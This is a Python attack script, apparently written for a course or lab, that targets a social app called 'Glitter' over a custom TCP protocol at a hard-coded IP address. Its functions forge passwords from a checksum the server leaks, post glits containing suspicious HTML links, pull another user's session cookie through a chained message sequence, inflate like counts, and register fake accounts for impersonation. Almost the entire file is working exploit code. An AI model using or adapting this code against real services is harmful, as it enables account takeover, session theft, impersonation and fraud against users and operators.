import socket
IP = "54.187.16.171"
PORT = 1336
# connect to the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (IP, PORT)
sock.connect(server_address)
# ascii dict : {char:index}
ASCII_DICT = dict(map(reversed, {i: chr(i) for i in range(128)}.items()))
# ascii dict : {index:char}
asciiDict = {i: chr(i) for i in range(128)}


def tcp_client(m, sock):
    """ Connect with the server
    :param m: message to send
    :param sock: the connection socket
    :return: server response
    """
    sock.sendall(m.encode())
    server_msg = sock.recv(1024).decode()
    return server_msg


def extract_check_sum(name, password):
    """Sending to the server request and extract the needed checksum
    :param name: username
    :param password: password
    :return: the checksum of the user
    """
    dct = {"username": f'"{name}"', "pass": f'"{password}"'}
    msg1 = """100#{gli&&er}{"user_name":""" + dct["username"] + ""","password":""" + dct[
        "pass"] + ""","enable_push_notifications":true}##"""
    server_msg = tcp_client(msg1, sock)
    if "105#Login received." in server_msg:
        print("Logged in!")
        return None
    else:
        s_index_checksum = server_msg.find("checksum:")
        e_index_checksum = server_msg.find("{")
        csum = server_msg[s_index_checksum + 10:e_index_checksum]
    return csum


def generate_password(name, password):
    """ creating possibility of password
    :param name: username
    :param password: password
    :return: password
    """
    # adding check of if the pass is correct
    csum = extract_check_sum(name, password)
    if csum is None:
        return
    ascii_name_sum = 0
    for i in name:
        ascii_name_sum += ASCII_DICT[i]
    required_checksum = int(csum) - ascii_name_sum
    possible_Str = ""
    i = 48
    while required_checksum > 0:
        if required_checksum in asciiDict.keys():
            possible_Str += asciiDict[required_checksum]
            break
        if i == 127:
            i = 48
        if required_checksum - i == 0:
            possible_Str += asciiDict[i]
            break
        if required_checksum - i > 0:
            required_checksum = required_checksum - i
            possible_Str += asciiDict[i]
            i += 1
            continue
        if required_checksum - i < 0:
            possible_Str += asciiDict[abs(required_checksum - i)]
            break
    return possible_Str


def xsrf(link, name_of_lnk, id, screen_name):
    """Sending  suspicious link as a glit
    :param link: link to send
    :param name_of_lnk: the suspicious name
    :param id: user id
    :param screen_name: screen name of the user
    """
    dct_l = {"l": f'"{link}\\"'}
    html_request = "  <html> <body>   <p><a href=\\" + dct_l["l"] + ">" + str(
        name_of_lnk) + """</a></p>  </body> </html>"""
    dct = {"html": f'"{html_request}"', "sname": f'"{screen_name}"', "date": f'"{"2022-12-14T16:50:58.754Z"}"'}
    m1 = """550#{gli&&er}{"feed_owner_id":12376,"publisher_id":""" + str(id) + ""","publisher_screen_name":""" + dct[
        "sname"] + ""","publisher_avatar":"im6","background_color":"White","date":""" + dct[
             "date"] + ""","content":""" + dct["html"] + ""","font_color":"black","id":-1}##"""
    r = tcp_client(m1, sock)
    if "555#Glit publish approved" in str(r):
         print("Glit posted!")
    else:
        print("Something went wrong:(")


def get_someone_cookie(id_u):
    """Getting someone's session cookies
    :param id_u: The id of your user
    :return: server response
    """
    name = input("Please enter the username that you want get cookie of")
    id_w = input("please enter the id of the user that you want get cookie of")
    dct = {"name": f'"{name}"', "id_me": f'"{id_u}"',"id_u": f'"{id_w}"'}
    m1 = '300#{gli&&er}{"search_type":"SIMPLE","search_entry":'+dct["name"]+'}##'
    tcp_client(m1, sock)
    m1= '320#{gli&&er}'+str(id_w)+'##'
    tcp_client(m1, sock)
    m1 = '400#{gli&&er}['+str(id_w)+','+str(id_u)+']##'
    tcp_client(m1, sock)
    m1 = '310#{gli&&er}'+str(id_w)+'##'
    tcp_client(m1, sock)
    m1 = '500#{gli&&er}{"feed_owner_id":'+str(id_w)+',"end_date":"2022-12-28T15:40:05.293Z","glit_count":2}##'
    tcp_client(m1,sock)
    m1 = '410#{gli&&er}['+str(id_u)+','+str(id_w)+']##'
    r = tcp_client(m1, sock)
    return r


def extract_cookie(id_u):
    """Extracting the cookie from the user response
    :param id_u: the id of your user
    """
    data = str(get_someone_cookie(id_u))
    find_s = data.find(":")+1
    find_e = data.find("{")
    cookie = data[find_s:find_e]
    print(cookie)


def logout(id):
    """Log out the user
    :param id: the id of the user
    :return: 1 - logout worked 0 - logout didn't work
    """
    m = "200#{gli&&er}" + str(id) + "##"
    r = tcp_client(m, sock)
    if "205#User logout approved{gli&&er}##" in r:
        return 1
    return 0


def many_likes(screen_name, id):
    """Sending many likes to glit
    :param screen_name: your screen name
    :param id: your user id
    """
    dct = {"name": f'"{screen_name}"'}
    m = """710#{gli&&er}{"glit_id":2205,"user_id":""" + str(id) + ""","user_screen_name":""" + dct[
        "name"] + ""","id":-1}##"""
    r = tcp_client(m, sock)
    if "715#Like publish" in r:
        tcp_client(m, sock)
        tcp_client(m, sock)
        print("Likes added to glit")
    else:
        print("Error")


def full_login(username, password, screen_name, id):
    """Login to the user
    :param username:your username
    :param password:your password
    :param screen_name:your screen name
    :param id:your id
    """
    dct = {"username": f'"{username}"', "pass": f'"{password}"', "date": f'"{"2022-12-14T16:50:58.754Z"}"',
           "sname": f'"{screen_name}"'}
    # login process:
    m1 = """100#{gli&&er}{"user_name":""" + dct["username"] + ""","password":""" + dct[
        "pass"] + ""","enable_push_notifications":true}##"""
    tcp_client(m1, sock)
    m1 = "110#{gli&&er}1231##"
    tcp_client(m1, sock)
    m1 = "310#{gli&&er}" + str(id) + "##"
    tcp_client(m1, sock)
    m1 = "440#{gli&&er}" + str(id) + "##"
    tcp_client(m1, sock)
    m1 = """500#{gli&&er}{"feed_owner_id":12376,"end_date":""" + dct["date"] + ""","glit_count":2}##"""
    r = tcp_client(m1, sock)
    if "505#Feed loading approved" in r:
        print("Login! :)")
    else:
        print("Something failed.")


def create_fake_account():
    """Impersonating another user
    """
    reg_code = input("please enter the register code")
    screen_name = input("please enter the screen name")
    description = input("please enter the description you want")
    privacy = input("Public or Private account (Notice To the big letters!)?")
    u_name = input("please enter user name")
    password = input('please enter password')
    gender = input("Male? Female? Leave blank? (Notice To the big letters!)")
    mail = input("Please enter valid email adress")
    dct = {"u_name": f'"{u_name}"', "pass": f'"{password}"', "reg_code": f'"{reg_code}"', "gender": f'"{gender}"',
           "sname": f'"{screen_name}"', "dec": f'"{description}"', "privacy": f'"{privacy}"', "mail": f'"{mail}"'}
    m = """150#{gli&&er}{"registration_code":""" + dct['reg_code'] + ""","user":{"screen_name":""" + dct[
        'sname'] + ""","avatar":"im1","description":""" + dct["dec"] + ""","privacy":""" + dct[
            "privacy"] + ""","id":-1,"user_name":""" + dct['u_name'] \
        + ""","password":""" + dct["pass"] + ""","gender":""" + dct["gender"] + ""","mail":""" + dct[
            "mail"] + """}}##"""
    r = tcp_client(m, sock)
    if "155#User registration approved" in r:
        print("Your fake user is created!")
    else:
        print("something went wrong:(")




